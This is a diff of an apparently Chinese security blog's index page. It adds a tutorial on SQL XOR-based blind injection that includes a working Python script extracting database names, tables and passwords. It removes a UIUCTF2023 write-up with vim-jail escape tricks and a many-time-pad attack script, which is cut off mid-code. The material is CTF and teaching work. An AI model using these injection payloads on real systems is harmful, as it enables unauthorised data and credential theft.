@@ -185,6 +185,102 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/03/01/sql%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="吕宙航">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lvzhouhang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/03/01/sql%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">sql异或注入</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-03-01 10:03:30 / 修改时间：10:49:12" itemprop="dateCreated datePublished" datetime="2024-03-01T10:03:30+08:00">2024-03-01</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="sql异或注入"><a href="#sql异或注入" class="headerlink" title="sql异或注入"></a>sql异或注入</h2><p>当waf过滤了很多东西，但是没有过滤异或(^)符的时候使用。</p>
+<h3 id="什么是异或注入"><a href="#什么是异或注入" class="headerlink" title="什么是异或注入"></a>什么是异或注入</h3><p>异步注入说简单一点就是在构造where后面的判断条件时使用^（异或符号）来达到sql注入攻击的目的</p>
+<p><strong>1^1=0 1^0=1</strong></p>
+<p>异或注入就是利用sql语句来进行盲注</p>
+<p>例如：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> student where <span class="title class_">Sname</span>=<span class="number">1</span>^(<span class="title function_">substr</span>(<span class="title function_">database</span>(),$变量<span class="number">1</span>$,<span class="number">1</span>)=$变量<span class="number">2</span>$);</span><br></pre></td></tr></table></figure>
+
+<p>这里就是看数据库的第<code>变量1</code>个字符是否等于<code>变量2</code>，如果相等就会变成<code>1^1</code>返回的是0，所以我们应该在最后再异或一个1</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> Sname<span class="operator">=</span><span class="number">1</span><span class="operator">^</span>(substr(database(),$变量<span class="number">1</span>$,<span class="number">1</span>)<span class="operator">=</span>$变量<span class="number">2</span>$)<span class="operator">^</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这样如果数据库的第<code>变量1</code>个字符等于<code>变量2</code>就会返回1，然后再配合脚本实现异或注入</p>
+<hr>
+<p>脚本:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = &quot;&quot;</span><br><span class="line">pay=&#x27;&#x27;</span><br><span class="line">column = &quot;&quot;</span><br><span class="line">for i in range(1, 1000):</span><br><span class="line">    time.sleep(0.06)</span><br><span class="line">    low = 32</span><br><span class="line">    high = 128</span><br><span class="line">    mid = (low + high) // 2</span><br><span class="line">    while (low &lt; high):</span><br><span class="line">        # 库名</span><br><span class="line">        #temp[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot; % (i, mid)</span><br><span class="line">        # 表名</span><br><span class="line">        # temp[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d)^1&quot; %(i,mid)</span><br><span class="line">        # 字段名</span><br><span class="line">        # temp[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot; %(i,mid)</span><br><span class="line">        # 内容</span><br><span class="line">        pay = &quot;1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot; %(i,mid)</span><br><span class="line">        r = requests.get(url+pay)</span><br><span class="line">        time.sleep(0.04)</span><br><span class="line">        print(low, high, mid, &quot;:&quot;)</span><br><span class="line">        if &quot;Click&quot; in r.text:			#自行更改返回字符</span><br><span class="line">            low = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // 2</span><br><span class="line">    if (mid == 32 or mid == 127):</span><br><span class="line">        break</span><br><span class="line">    column += chr(mid)</span><br><span class="line">    print(column)</span><br><span class="line"></span><br><span class="line">print(&quot;All:&quot;, column)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2024/02/11/order-by-%E7%9B%B2%E6%B3%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1227,154 +1323,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/04/UIUCTF023/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="吕宙航">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="lvzhouhang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/07/04/UIUCTF023/" class="post-title-link" itemprop="url">UIUCTF2023</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-07-04 19:58:02" itemprop="dateCreated datePublished" datetime="2023-07-04T19:58:02+08:00">2023-07-04</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-07-05 16:20:55" itemprop="dateModified" datetime="2023-07-05T16:20:55+08:00">2023-07-05</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>10k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>9 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="vimjail1"><a href="#vimjail1" class="headerlink" title="vimjail1"></a>vimjail1</h2><p>这道题一连接就是插入模式，想办法退出插入模式.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#entry.sh</span><br><span class="line">#!/usr/bin/env sh</span><br><span class="line"></span><br><span class="line">chmod -r /flag.txt</span><br><span class="line"></span><br><span class="line">vim -R -M -Z -u /home/user/vimrc</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>以只读、文本不可修改、限制模式、启动并且用<code>/home/user/vimrc</code>替代了原有的.vimrc</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#vimrc</span><br><span class="line">set nocompatible</span><br><span class="line">set insertmode</span><br><span class="line"># 禁用了兼容模式，并且默认启动插入模式</span><br><span class="line">inoremap &lt;c-o&gt; nope</span><br><span class="line">inoremap &lt;c-l&gt; nope</span><br><span class="line">inoremap &lt;c-z&gt; nope</span><br><span class="line">inoremap &lt;c-\&gt;&lt;c-n&gt; nope</span><br><span class="line"># 将这些组合键转换为插入单词nope</span><br></pre></td></tr></table></figure>
-
-<p>但是可以按两次<code>ctrl+\</code>再按一次<code>ctrl+n</code>来绕过，然后用<code>:e</code>来读取flag。</p>
-<p><code>:e</code>表示编辑一个文件</p>
-<p><img src="/pic/uiu/vim1.png"></p>
-<h2 id="vimjail2"><a href="#vimjail2" class="headerlink" title="vimjail2"></a>vimjail2</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#entry.sh</span></span><br><span class="line"><span class="comment">#!/usr/bin/env sh</span></span><br><span class="line"></span><br><span class="line">vim -R -M -Z -u /home/user/vimrc -i /home/user/viminfo</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /flag.txt</span><br></pre></td></tr></table></figure>
-
-<p>以只读模式、文本不可修改、限制模式启动vim，替换了原有的vimrc和viminfo</p>
- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">#vimrc</span><br><span class="line">set nocompatible</span><br><span class="line">set insertmode</span><br><span class="line"></span><br><span class="line">inoremap &lt;c-o&gt; nope</span><br><span class="line">inoremap &lt;c-l&gt; nope</span><br><span class="line">inoremap &lt;c-z&gt; nope</span><br><span class="line">inoremap &lt;c-\&gt;&lt;c-n&gt; nope</span><br><span class="line"></span><br><span class="line">cnoremap a _</span><br><span class="line">cnoremap b _</span><br><span class="line">cnoremap c _</span><br><span class="line">cnoremap d _</span><br><span class="line">cnoremap e _</span><br><span class="line">cnoremap f _</span><br><span class="line">cnoremap g _</span><br><span class="line">cnoremap h _</span><br><span class="line">cnoremap i _</span><br><span class="line">cnoremap j _</span><br><span class="line">cnoremap k _</span><br><span class="line">cnoremap l _</span><br><span class="line">cnoremap m _</span><br><span class="line">cnoremap n _</span><br><span class="line">cnoremap o _</span><br><span class="line">cnoremap p _</span><br><span class="line">cnoremap r _</span><br><span class="line">cnoremap s _</span><br><span class="line">cnoremap t _</span><br><span class="line">cnoremap u _</span><br><span class="line">cnoremap v _</span><br><span class="line">cnoremap w _</span><br><span class="line">cnoremap x _</span><br><span class="line">cnoremap y _</span><br><span class="line">cnoremap z _</span><br><span class="line">cnoremap ! _</span><br><span class="line">cnoremap @ _</span><br><span class="line">cnoremap # _</span><br><span class="line">cnoremap $ _</span><br><span class="line">cnoremap % _</span><br><span class="line">cnoremap ^ _</span><br><span class="line">cnoremap &amp; _</span><br><span class="line">cnoremap * _</span><br><span class="line">cnoremap - _</span><br><span class="line">cnoremap + _</span><br><span class="line">cnoremap = _</span><br><span class="line">cnoremap ` _</span><br><span class="line">cnoremap ~ _</span><br><span class="line">cnoremap &#123; _</span><br><span class="line">cnoremap &#125; _</span><br><span class="line">cnoremap [ _</span><br><span class="line">cnoremap ] _</span><br><span class="line">cnoremap \| _</span><br><span class="line">cnoremap \ _</span><br><span class="line">cnoremap ; _</span><br><span class="line">cnoremap &lt; _</span><br><span class="line">cnoremap &gt; _</span><br><span class="line">cnoremap , _</span><br><span class="line">cnoremap . _</span><br><span class="line">cnoremap / _</span><br><span class="line">cnoremap ? _</span><br></pre></td></tr></table></figure>
-
-<p>将所有字符都转换成了下划线，绕过方式还是两次<code>ctrl+\</code>+<code>ctrl+n</code>，entry.sh中最后有一个<code>cat /flag</code>,这意味着退出vim后会打印出flag.</p>
-<p><code>:q</code>即可。</p>
-<h2 id="Corny-Kernel"><a href="#Corny-Kernel" class="headerlink" title="Corny Kernel"></a>Corny Kernel</h2><p>附件给了一个c文件</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: GPL-2.0-only</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pr_fmt(fmt) KBUILD_MODNAME <span class="string">&quot;: &quot;</span> fmt</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="type">char</span> *flag1, *flag2;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">pwny_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	pr_alert(<span class="string">&quot;%s\n&quot;</span>, flag1);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">pwny_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	pr_info(<span class="string">&quot;%s\n&quot;</span>, flag2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(pwny_init);</span><br><span class="line">module_exit(pwny_exit);</span><br><span class="line"></span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Nitya&quot;</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;UIUCTF23&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_VERSION(<span class="string">&quot;0.1&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>下面的代码的意思是当加载模块的时候输出第一段flag</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">pwny_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	pr_alert(<span class="string">&quot;%s\n&quot;</span>, flag1);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">module_init(pwny_init); #这行代码将 pwny_init 函数注册为模块的初始化函数。在模块加载时，该函数将被调用。</span><br></pre></td></tr></table></figure>
-
-<p>首先用<code>gzip -d pwnymodule.ko.gz</code>，然后用<code>insmod pwnymodule.ko</code>加载这个模块，加载完成后会输出第一串flag。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">pwny_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	pr_info(<span class="string">&quot;%s\n&quot;</span>, flag2);</span><br><span class="line">&#125;</span><br><span class="line">module_exit(pwny_exit);   #这行代码将 pwny_exit 函数注册为模块的退出函数。在模块被卸载时，该函数将被调用来执行清理操作。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>这一串代码的意思是这个模块在被卸载的时候输出第二段flag,用<code>rmmod pwnymodule.ko</code>这个卸载模块,然后用<code>dmesg</code>输出内核的信息，在最后会输出两段flag。</p>
-<h2 id="vimjail1-5"><a href="#vimjail1-5" class="headerlink" title="vimjail1.5"></a>vimjail1.5</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#entry.sh</span></span><br><span class="line"><span class="comment">#!/usr/bin/env sh</span></span><br><span class="line"></span><br><span class="line">vim -R -M -Z -u /home/user/vimrc</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#vimrc</span><br><span class="line">set nocompatible</span><br><span class="line">set insertmode</span><br><span class="line"></span><br><span class="line">inoremap &lt;c-o&gt; nope</span><br><span class="line">inoremap &lt;c-l&gt; nope</span><br><span class="line">inoremap &lt;c-z&gt; nope</span><br><span class="line">inoremap &lt;c-\&gt; nope</span><br></pre></td></tr></table></figure>
-
-<p>别的没变，但是之前的方法没用了，用<code>ctrl+r</code>这个用于执行撤销和重做操作。然后用<code>=execute(readfile(&#39;flag.txt&#39;))</code></p>
-<p><code>=</code> 是用于执行表达式的命令。<code>execute()</code>：<code>execute()</code> 函数用于执行 Vim 命令。<code>readfile(&#39;flag.txt&#39;)</code>：使用 Vim 的内置函数 <code>readfile()</code> 读取名为 <code>flag.txt</code> 的文件内容，并返回一个包含文件内容的列表。就是将flag.txt里面的内容变成命令执行,然后就会报错</p>
-<p><img src="/pic/uiu/vim1.5.png"></p>
-<p>或者，用<code>=execute(&#39;:e flag.txt&#39;)</code>然后按两次回车。</p>
-<h2 id="vimjail2-5"><a href="#vimjail2-5" class="headerlink" title="vimjail2.5"></a>vimjail2.5</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">#vimrc</span><br><span class="line">set nocompatible</span><br><span class="line">set insertmode</span><br><span class="line"></span><br><span class="line">inoremap &lt;c-o&gt; nope</span><br><span class="line">inoremap &lt;c-l&gt; nope</span><br><span class="line">inoremap &lt;c-z&gt; nope</span><br><span class="line">inoremap &lt;c-\&gt; nope</span><br><span class="line"></span><br><span class="line">cnoremap a _</span><br><span class="line">cnoremap b _</span><br><span class="line">cnoremap c _</span><br><span class="line">cnoremap d _</span><br><span class="line">cnoremap e _</span><br><span class="line">cnoremap f _</span><br><span class="line">cnoremap g _</span><br><span class="line">cnoremap h _</span><br><span class="line">cnoremap i _</span><br><span class="line">cnoremap j _</span><br><span class="line">cnoremap k _</span><br><span class="line">cnoremap l _</span><br><span class="line">cnoremap m _</span><br><span class="line">cnoremap n _</span><br><span class="line">cnoremap o _</span><br><span class="line">cnoremap p _</span><br><span class="line">cnoremap r _</span><br><span class="line">cnoremap s _</span><br><span class="line">cnoremap t _</span><br><span class="line">cnoremap u _</span><br><span class="line">cnoremap v _</span><br><span class="line">cnoremap w _</span><br><span class="line">cnoremap x _</span><br><span class="line">cnoremap y _</span><br><span class="line">cnoremap z _</span><br><span class="line">cnoremap ! _</span><br><span class="line">cnoremap @ _</span><br><span class="line">cnoremap # _</span><br><span class="line">cnoremap $ _</span><br><span class="line">cnoremap % _</span><br><span class="line">cnoremap ^ _</span><br><span class="line">cnoremap &amp; _</span><br><span class="line">cnoremap * _</span><br><span class="line">cnoremap - _</span><br><span class="line">cnoremap + _</span><br><span class="line">cnoremap = _</span><br><span class="line">cnoremap ` _</span><br><span class="line">cnoremap ~ _</span><br><span class="line">cnoremap &#123; _</span><br><span class="line">cnoremap &#125; _</span><br><span class="line">cnoremap [ _</span><br><span class="line">cnoremap ] _</span><br><span class="line">cnoremap \| _</span><br><span class="line">cnoremap \ _</span><br><span class="line">cnoremap ; _</span><br><span class="line">cnoremap &lt; _</span><br><span class="line">cnoremap &gt; _</span><br><span class="line">cnoremap , _</span><br><span class="line">cnoremap . _</span><br><span class="line">cnoremap / _</span><br><span class="line">cnoremap ? _</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>这个只能输入<code>:q</code>，方法基本上差不多，还是<code>ctrl+r</code>然后<code>=</code>,按<code>TAB</code>键可以补全内置代码，然后找到<code>execute</code>，最后的命令是<code>execute(&quot;:q&quot;)</code>，后会输出flag。</p>
-<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="Three-Time-Pad"><a href="#Three-Time-Pad" class="headerlink" title="Three-Time Pad"></a>Three-Time Pad</h2><p><a target="_blank" rel="noopener" href="http://dann.com.br/alexctf2k17-crypto100-many_time_secrets/">http://dann.com.br/alexctf2k17-crypto100-many_time_secrets/</a></p>
-<p>看这篇博客，用他的脚本可以解出这道题</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017</span></span><br><span class="line"><span class="comment"># @author intrd - http://dann.com.br/ </span></span><br><span class="line"><span class="comment"># Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> sets, sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 11 unknown ciphertexts (in hex format), all encrpyted with the same key</span></span><br><span class="line">c1 = <span class="string">&quot;14f5f95b4a252948a8aef177d6c92d82e3016362bd7463f41f40a00ad9e0ccad911b959ef8dfad5f1cc4481ecb64&quot;</span></span><br><span class="line">c2 = <span class="string">&quot;06e2f65a4c256d0ba8ada164cecd329cae436069f83476e91757e91bd4a4cce2c60a8f9aac8cb14210d55253cd787c0f6a&quot;</span></span><br><span class="line">c3 = <span class="string">&quot;03f9ea574c267249b2b1ef5d91cd3c99904a3f75873871e94157df0fcbb5d1eab94f9386&quot;</span></span><br><span class="line">ciphers = [c1, c2, c3]</span><br><span class="line"><span class="comment"># The target ciphertext we want to crack</span></span><br><span class="line">target_cipher = <span 